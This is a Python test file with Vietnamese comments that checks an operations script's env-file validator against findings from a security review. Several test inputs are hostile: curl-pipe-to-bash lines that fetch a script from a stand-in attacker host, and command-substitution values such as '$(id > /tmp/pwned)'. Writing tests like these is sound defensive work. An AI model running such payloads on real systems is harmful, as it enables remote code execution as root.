"""Bai kiem hoi quy cho cac phat hien cua ban ra soat bao mat doc lap
(Antigravity Claude Opus, 2026-09-04) tren co che cutover.

Moi bai kiem o day tuong ung MOT phat hien co ma so. Chung phai THAT BAI
tren ban ma nguon truoc khi sua — do la dieu kien de tin rang chung co rang.

  F1 CRITICAL  chen lenh bash qua `env.stage` -> chay bang root
  F5 HIGH      `vh_start` khong co rao chan worker ngoai
  F8 LOW       ban khang dinh nguoc thieu ve
"""
from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from scripts.ops.cutover_target import (  # noqa: E402
    KY_TU_CAM,
    PROD_APPWRITE_DATABASE_ID,
    PROD_APPWRITE_ENDPOINT,
    PROD_APPWRITE_PROJECT_ID,
    PROD_R2_BUCKET,
    CutoverRefused,
    bien_ngoai_danh_sach,
    bien_nguy_hiem,
    doc_env_text,
    khang_dinh_khong_phai_production,
    khang_dinh_production,
    khang_dinh_tep_env,
    render_env_text,
)

GOC = Path(__file__).resolve().parents[2]

ENV_HOP_LE = f"""FAS_ENV=production
DATA_BACKEND=appwrite
STORAGE_BACKEND=r2
FAS_INLINE_WORKER=false
APPWRITE_ENDPOINT={PROD_APPWRITE_ENDPOINT}
APPWRITE_PROJECT_ID={PROD_APPWRITE_PROJECT_ID}
APPWRITE_DATABASE_ID={PROD_APPWRITE_DATABASE_ID}
APPWRITE_API_KEY=AAAA
R2_ACCOUNT_ID=AAAA
R2_BUCKET={PROD_R2_BUCKET}
R2_ACCESS_KEY_ID=AAAA
R2_SECRET_ACCESS_KEY=AAAA
FAS_LOCAL_VOICES=piper:ngochuyen,piper:ngochuyennew
FAS_PUBLIC_VOICE_LANGUAGES=vi
"""


class F1_ChenLenh(unittest.TestCase):
    """F1 (CRITICAL) — leo thang quyen tu `ubuntu` len root.

    Duong tan cong THAT: bo phan tich Python bo qua moi dong khong co `=`,
    con tep tho thi duoc `bash` doc bang `. <(...)` bang root. Nen mot dong
    `curl ke-tan-cong/x | sh` di lot qua kiem duyet roi CHAY.
    """

    def test_dong_khong_co_dau_bang_bi_TU_CHOI(self):
        doc = ENV_HOP_LE + "curl http://ke-tan-cong/shell.sh | bash\n"
        env = doc_env_text(doc)
        # Bo phan tich VAN bo qua dong do — do la ban chat cua no...
        self.assertNotIn("curl http://ke-tan-cong/shell.sh | bash", env)
        # ...nen an toan KHONG duoc dua vao bo phan tich. Ban SINH LAI phai
        # lam dong do bien mat.
        sinh_lai = render_env_text(env)
        self.assertNotIn("curl", sinh_lai)
        self.assertNotIn("ke-tan-cong", sinh_lai)
        self.assertNotIn("bash", sinh_lai)

    def test_bien_LA_mang_command_substitution_bi_TU_CHOI(self):
        doc = ENV_HOP_LE + "X=$(curl http://ke-tan-cong/x | sh)\n"
        env = doc_env_text(doc)
        with self.assertRaises(CutoverRefused) as ctx:
            khang_dinh_tep_env(env)
        self.assertIn("X", str(ctx.exception))

    def test_gia_tri_cua_bien_BAT_BUOC_mang_command_substitution_bi_TU_CHOI(self):
        doc = ENV_HOP_LE.replace("APPWRITE_API_KEY=AAAA",
                                 "APPWRITE_API_KEY=$(id > /tmp/pwned)")
        with self.assertRaises(CutoverRefused) as ctx:
            khang_dinh_tep_env(doc_env_text(doc))
        self.assertIn("APPWRITE_API_KEY", str(ctx.exception))

    def test_moi_ky_tu_chay_duoc_deu_bi_chan(self):
        for c in KY_TU_CAM:
            if c in ("\n", "\r"):
                continue          # tach dong — kiem rieng ben duoi
            with self.subTest(ky_tu=repr(c)):
                doc = ENV_HOP_LE.replace("R2_ACCOUNT_ID=AAAA",
                                         f"R2_ACCOUNT_ID=AA{c}AA")
                with self.assertRaises(CutoverRefused):
                    khang_dinh_tep_env(doc_env_text(doc))

    def test_bien_ngoai_allowlist_bi_TU_CHOI_du_hoan_toan_vo_hai(self):
        """Tep nay duoc SINH RA tu allowlist, nen mot bien la nghia la co
        ai do chen them — khong phai mot cau hinh bi bo quen."""
        doc = ENV_HOP_LE + "LANG=vi_VN.UTF-8\n"
        with self.assertRaises(CutoverRefused) as ctx:
            khang_dinh_tep_env(doc_env_text(doc))
        self.assertIn("LANG", str(ctx.exception))

    def test_ban_SINH_LAI_chi_giu_dung_allowlist(self):
        env = doc_env_text(ENV_HOP_LE + "X=1\nY=2\nlenh la\n")
        sinh_lai = doc_env_text(render_env_text(env))
        self.assertEqual(bien_ngoai_danh_sach(sinh_lai), [])
        self.assertEqual(bien_nguy_hiem(sinh_lai), [])
        khang_dinh_tep_env(sinh_lai)

    def test_env_hop_le_van_qua(self):
        khang_dinh_tep_env(doc_env_text(ENV_HOP_LE))

    def test_render_tu_choi_gia_tri_chay_duoc_va_KHONG_in_gia_tri(self):
        e = doc_env_text(ENV_HOP_LE)
        e["APPWRITE_API_KEY"] = "BI_MAT$(x)"
        with self.assertRaises(CutoverRefused) as ctx:
            render_env_text(e)
        self.assertNotIn("BI_MAT", str(ctx.exception))

    @staticmethod
    def _ma_khong_ghi_chu(p: Path) -> str:
        """Bo dong ghi chu truoc khi quet.

        Ghi chu trong tep NHAC DEN `. <(...)` de giai thich vi sao khong
        dung no. Quet ca ghi chu thi bai kiem that bai vi chinh loi giai
        thich cua no — mot bai kiem dat/truot vi ly do sai.
        """
        return "\n".join(d for d in p.read_text(encoding="utf-8", errors="replace")
                         .splitlines() if not d.lstrip().startswith("#"))

    def test_KHONG_con_duong_bash_source_nao(self):
        """Sua goc re: khong con `source` tep env o bat ky dau."""
        ma = self._ma_khong_ghi_chu(GOC / "scripts" / "ops" / "fanfic_prod_admin.sh")
        # `. <(...)` va `source <(...)` deu THUC THI noi dung tep.
        for xau in (". <(", "source <(", '. "$ENV_PROD"', 'source "$ENV_PROD"'):
            self.assertNotIn(xau, ma, f"con duong sourcing: {xau!r}")

    def test_cai_dat_dung_ban_SINH_LAI_chu_khong_phai_tep_tho(self):
        sh = (GOC / "scripts" / "ops" / "fanfic_prod_admin.sh").read_text(
            encoding="utf-8", errors="replace")
        self.assertIn("--emit", sh)
        # Khong duoc con dong cai thang tu $STAGE.
        self.assertNotIn('install -m 0640 -o root -g fanfic "$STAGE"', sh)

    def test_trinh_cai_KHONG_lui_ve_thu_muc_cua_ben_khong_dac_quyen(self):
        """F3 — mot lan `git fetch` that bai tung lam trinh cai dat ma cua
        ke tan cong tu /home vao /usr/local/sbin."""
        sh = (GOC / "scripts" / "ops" / "install_prod_admin.sh").read_text(
            encoding="utf-8", errors="replace")
        self.assertNotIn('SRC=/home/"$NGUOI"/fanfic_prod_admin.sh', sh)


class F5_RaoChanWorkerNgoai(unittest.TestCase):
    """F5 (HIGH) — `start` den tu hang doi ma ben khong-dac-quyen ghi duoc,
    nen no co the bo qua bo dieu phoi. Rao chan phai song tren may dich."""

    def test_vh_start_goi_rao_chan(self):
        sh = (GOC / "scripts" / "ops" / "fanfic_prod_admin.sh").read_text(
            encoding="utf-8", errors="replace")
        i = sh.index("vh_start()")
        than = sh[i:sh.index("vh_stop()", i)]
        self.assertIn("prod_start_guard.py", than)

    def test_rao_chan_fail_closed_khi_khong_doc_duoc_hang_doi(self):
        import scripts.ops.prod_start_guard as g
        src = Path(g.__file__).read_text(encoding="utf-8", errors="replace")
        # Nhanh loi phai tra 2 (tu choi), khong phai 0.
        self.assertIn("return 2", src)
        self.assertIn("fail closed", src.lower())

    def test_pid_tren_may_nay(self):
        import scripts.ops.prod_start_guard as g
        self.assertFalse(g.pid_tren_may_nay(""))
        self.assertFalse(g.pid_tren_may_nay("khong-co-pid"))
        self.assertFalse(g.pid_tren_may_nay("999999999-abc"))


class F8_KhangDinhNguocDayDu(unittest.TestCase):
    """F8 — ban kiem nguoc truoc day chi kiem bucket + project."""

    def test_endpoint_production_trong_env_staging_bi_TU_CHOI(self):
        with self.assertRaises(CutoverRefused):
            khang_dinh_khong_phai_production({
                "R2_BUCKET": "fanfic-staging",
                "APPWRITE_PROJECT_ID": "fanfic-world-staging",
                "APPWRITE_ENDPOINT": PROD_APPWRITE_ENDPOINT,
            })

    def test_database_production_trong_env_staging_bi_TU_CHOI(self):
        with self.assertRaises(CutoverRefused):
            khang_dinh_khong_phai_production({
                "R2_BUCKET": "fanfic-staging",
                "APPWRITE_PROJECT_ID": "fanfic-world-staging",
                "APPWRITE_DATABASE_ID": PROD_APPWRITE_DATABASE_ID,
            })

    def test_staging_that_su_van_qua(self):
        khang_dinh_khong_phai_production({
            "R2_BUCKET": "fanfic-staging",
            "APPWRITE_PROJECT_ID": "fanfic-world-staging",
            "APPWRITE_DATABASE_ID": "fanfic_world_staging",
            "APPWRITE_ENDPOINT": "https://sgp.cloud.appwrite.io/v1",
        })


class KhangDinhLongVaNghiemNgat(unittest.TestCase):
    """`os.environ` cua bat ky tien trinh nao cung co PATH/HOME/... nen ban
    NGHIEM NGAT chi duoc ap cho mot TEP."""

    def test_os_environ_co_bien_la_van_qua_ban_long(self):
        e = dict(doc_env_text(ENV_HOP_LE))
        e.update({"PATH": "/usr/bin:/bin", "HOME": "/root",
                  "LS_COLORS": "rs=0:di=01;34:*.tar=01;31"})
        khang_dinh_production(e)          # ban long: dat
        with self.assertRaises(CutoverRefused):
            khang_dinh_tep_env(e)         # ban nghiem ngat: tu choi


if __name__ == "__main__":
    unittest.main()
